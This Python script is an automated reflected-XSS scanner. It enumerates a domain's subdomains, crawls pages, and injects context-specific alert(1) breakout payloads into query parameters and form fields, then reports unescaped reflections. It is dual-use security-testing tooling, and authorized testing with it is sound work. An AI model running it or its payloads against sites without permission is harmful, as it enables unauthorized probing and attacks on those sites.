#!/usr/bin/env python3
"""Simple authorized XSS assessment helper."""

from __future__ import annotations

import argparse
import json
import socket
import time
from dataclasses import dataclass
from html import escape
from html.parser import HTMLParser
from typing import Iterable
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse
from urllib.request import Request, urlopen

USER_AGENT = "XSS-Scanner/0.2 (authorized security testing only)"
MARKER = "XSSSCANMARK"
DEFAULT_PAYLOADS = [
    '<script>alert(1)</script>',
    '" onmouseover="alert(1)" x="',
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
]
BREAKOUT_PAYLOADS = {
    "html_text": ["<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "</title><svg/onload=alert(1)>"],
    "tag_or_unknown": ["><svg/onload=alert(1)>", "></script><svg/onload=alert(1)>"],
    "attr_double": ['" autofocus onfocus=alert(1) x="', '"/><svg/onload=alert(1)>'],
    "attr_single": ["' autofocus onfocus=alert(1) x='", "'/><svg/onload=alert(1)>"],
    "script": ["';alert(1);//", '";alert(1);//', "</script><svg/onload=alert(1)>"],
}
COMMON_SUBDOMAIN_PREFIXES = ["www", "app", "api", "dev", "test", "staging", "admin", "portal", "beta", "m"]


@dataclass
class HttpResponse:
    url: str
    status: int
    content_type: str
    text: str


@dataclass
class Vulnerability:
    url: str
    vector: str
    payload: str
    evidence: str


class PageParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.links: list[str] = []
        self.forms: list[dict] = []
        self._active_form: dict | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attr_map = {k: (v or "") for k, v in attrs}
        if tag == "a" and "href" in attr_map:
            self.links.append(attr_map["href"])
        elif tag == "form":
            self._active_form = {
                "action": attr_map.get("action", ""),
                "method": attr_map.get("method", "get").lower(),
                "inputs": [],
            }
            self.forms.append(self._active_form)
        elif tag in {"input", "textarea", "select"} and self._active_form is not None:
            name = attr_map.get("name")
            if name:
                self._active_form["inputs"].append(name)

    def handle_endtag(self, tag: str) -> None:
        if tag == "form":
            self._active_form = None


def normalize_domain(domain: str) -> str:
    domain = domain.strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc
    return domain.split(":")[0]


def http_request(url: str, timeout: float, method: str = "GET", data: bytes | None = None) -> HttpResponse | None:
    req = Request(url=url, method=method, data=data, headers={"User-Agent": USER_AGENT})
    try:
        with urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            text = raw.decode("utf-8", errors="replace")
            return HttpResponse(
                url=resp.geturl(),
                status=getattr(resp, "status", 200),
                content_type=resp.headers.get("Content-Type", ""),
                text=text,
            )
    except (HTTPError, URLError, TimeoutError):
        return None


def discover_subdomains(domain: str, timeout: float) -> set[str]:
    discovered = set()
    crt = http_request(f"https://crt.sh/?q=%25.{domain}&output=json", timeout)
    if crt and crt.text:
        try:
            entries = json.loads(crt.text)
            for item in entries:
                for name in str(item.get("name_value", "")).splitlines():
                    clean = name.replace("*.", "").strip().lower()
                    if clean.endswith(f".{domain}") or clean == domain:
                        discovered.add(clean)
        except json.JSONDecodeError:
            pass

    for prefix in COMMON_SUBDOMAIN_PREFIXES:
        discovered.add(f"{prefix}.{domain}")
    discovered.add(domain)

    resolved = set()
    for host in discovered:
        try:
            socket.gethostbyname(host)
            resolved.add(host)
        except socket.gaierror:
            continue
    return resolved


def candidate_base_urls(host: str) -> list[str]:
    return [f"https://{host}", f"http://{host}"]


def fetch_html(url: str, timeout: float) -> HttpResponse | None:
    response = http_request(url, timeout)
    if response and "text/html" in response.content_type.lower():
        return response
    return None


def collect_links(seed_url: str, html: str, domain: str, max_links: int) -> set[str]:
    parser = PageParser()
    parser.feed(html)
    links: set[str] = set()
    for href in parser.links:
        absolute = urljoin(seed_url, href)
        parsed = urlparse(absolute)
        if not parsed.scheme.startswith("http"):
            continue
        if not parsed.netloc.endswith(domain):
            continue
        cleaned = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", parsed.query, ""))
        links.add(cleaned)
        if len(links) >= max_links:
            break
    return links


def extract_form_details(html: str) -> list[dict]:
    parser = PageParser()
    parser.feed(html)
    return parser.forms


def analyze_reflection_context(body: str, marker: str) -> str | None:
    idx = body.find(marker)
    if idx == -1:
        return None

    before = body[max(0, idx - 300) : idx].lower()
    tail = body[idx : min(len(body), idx + 300)].lower()

    last_script_open = before.rfind("<script")
    last_script_close = before.rfind("</script>")
    if last_script_open > last_script_close and "</script>" in tail:
        return "script"

    tag_open = before.rfind("<")
    tag_close = before.rfind(">")
    if tag_open > tag_close:
        tag_segment = before[tag_open:]
        if tag_segment.count('"') % 2 == 1:
            return "attr_double"
        if tag_segment.count("'") % 2 == 1:
            return "attr_single"
        return "tag_or_unknown"

    return "html_text"


def choose_breakout_payloads(context: str | None) -> list[str]:
    if context is None:
        return DEFAULT_PAYLOADS
    return BREAKOUT_PAYLOADS.get(context, BREAKOUT_PAYLOADS["tag_or_unknown"])


def reflection_is_escaped(body: str, marker: str) -> bool:
    escaped_variants = {escape(marker), marker.replace("<", "&lt;").replace(">", "&gt;")}
    return any(v in body for v in escaped_variants)


def build_test_url(parsed, params: dict[str, str]) -> str:
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", urlencode(params), ""))


def test_query_reflection(url: str, timeout: float) -> list[Vulnerability]:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings: list[Vulnerability] = []
    if not params:
        return findings

    for param in params:
        probe_params = {k: v[-1] for k, v in params.items()}
        probe_params[param] = MARKER
        probe_url = build_test_url(parsed, probe_params)
        probe_resp = http_request(probe_url, timeout)
        if not probe_resp or MARKER not in probe_resp.text:
            continue

        context = analyze_reflection_context(probe_resp.text, MARKER)
        payloads = choose_breakout_payloads(context)
        escaped = reflection_is_escaped(probe_resp.text, MARKER)

        for payload in payloads:
            test_params = {k: v[-1] for k, v in params.items()}
            test_params[param] = payload
            test_url = build_test_url(parsed, test_params)
            resp = http_request(test_url, timeout)
            if not resp:
                continue

            if payload in resp.text:
                escape_note = "Reflection appears HTML-escaped in probe response." if escaped else "Probe reflection was raw."
                findings.append(
                    Vulnerability(
                        test_url,
                        f"query parameter: {param}",
                        payload,
                        f"Potential breakout in {context or 'unknown'} context. {escape_note}",
                    )
                )

    return findings


def test_form_reflection(form: dict, current_url: str, timeout: float) -> list[Vulnerability]:
    if not form.get("inputs"):
        return []

    action_url = urljoin(current_url, form.get("action", ""))
    method = form.get("method", "get").lower()
    findings: list[Vulnerability] = []

    for field in form["inputs"]:
        probe_fields = {name: "seed" for name in form["inputs"]}
        probe_fields[field] = MARKER
        probe_encoded = urlencode(probe_fields).encode()

        if method == "post":
            probe_resp = http_request(action_url, timeout, method="POST", data=probe_encoded)
        else:
            sep = "&" if urlparse(action_url).query else "?"
            probe_resp = http_request(f"{action_url}{sep}{urlencode(probe_fields)}", timeout)

        if not probe_resp or MARKER not in probe_resp.text:
            continue

        context = analyze_reflection_context(probe_resp.text, MARKER)
        payloads = choose_breakout_payloads(context)
        escaped = reflection_is_escaped(probe_resp.text, MARKER)

        for payload in payloads:
            test_fields = {name: "seed" for name in form["inputs"]}
            test_fields[field] = payload
            encoded = urlencode(test_fields).encode()
            if method == "post":
                resp = http_request(action_url, timeout, method="POST", data=encoded)
            else:
                sep = "&" if urlparse(action_url).query else "?"
                resp = http_request(f"{action_url}{sep}{urlencode(test_fields)}", timeout)

            if resp and payload in resp.text:
                escape_note = "Reflection appears HTML-escaped in probe response." if escaped else "Probe reflection was raw."
                findings.append(
                    Vulnerability(
                        action_url,
                        f"form field: {field} ({method.upper()})",
                        payload,
                        f"Potential breakout in {context or 'unknown'} context. {escape_note}",
                    )
                )

    return findings


def dedupe_findings(findings: list[Vulnerability]) -> list[Vulnerability]:
    seen: set[tuple[str, str, str]] = set()
    unique: list[Vulnerability] = []
    for f in findings:
        key = (f.url, f.vector, f.payload)
        if key in seen:
            continue
        seen.add(key)
        unique.append(f)
    return unique


def scan(domain: str, timeout: float, max_links: int, delay: float) -> list[Vulnerability]:
    findings: list[Vulnerability] = []
    subdomains = discover_subdomains(domain, timeout)

    print(f"[+] Resolved subdomains: {len(subdomains)}")
    for sub in sorted(subdomains):
        print(f"    - {sub}")

    for host in sorted(subdomains):
        base: HttpResponse | None = None
        for candidate in candidate_base_urls(host):
            base = fetch_html(candidate, timeout)
            if base:
                break
        if not base:
            continue

        print(f"[+] Crawling {base.url}")
        urls = {base.url}
        urls.update(collect_links(base.url, base.text, domain, max_links))

        for url in sorted(urls):
            time.sleep(delay)
            page = fetch_html(url, timeout)
            if not page:
                continue
            print(f"    [*] Testing: {url}")
            findings.extend(test_query_reflection(url, timeout))
            for form in extract_form_details(page.text):
                findings.extend(test_form_reflection(form, url, timeout))

    return dedupe_findings(findings)


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Discover subdomains and test likely XSS injection points.")
    p.add_argument("target", help="Target domain like example.com")
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--max-links", type=int, default=30)
    p.add_argument("--delay", type=float, default=0.1)
    return p


def main() -> None:
    args = build_parser().parse_args()
    print("[!] Use only with explicit written authorization.")
    domain = normalize_domain(args.target)
    findings = scan(domain, args.timeout, args.max_links, args.delay)

    print("\n=== Findings ===")
    if not findings:
        print("No reflected XSS patterns found with current payload list.")
        return

    for i, finding in enumerate(findings, 1):
        print(f"{i}. URL: {finding.url}")
        print(f"   Vector: {finding.vector}")
        print(f"   Payload: {finding.payload}")
        print(f"   Evidence: {finding.evidence}")


if __name__ == "__main__":
    main()
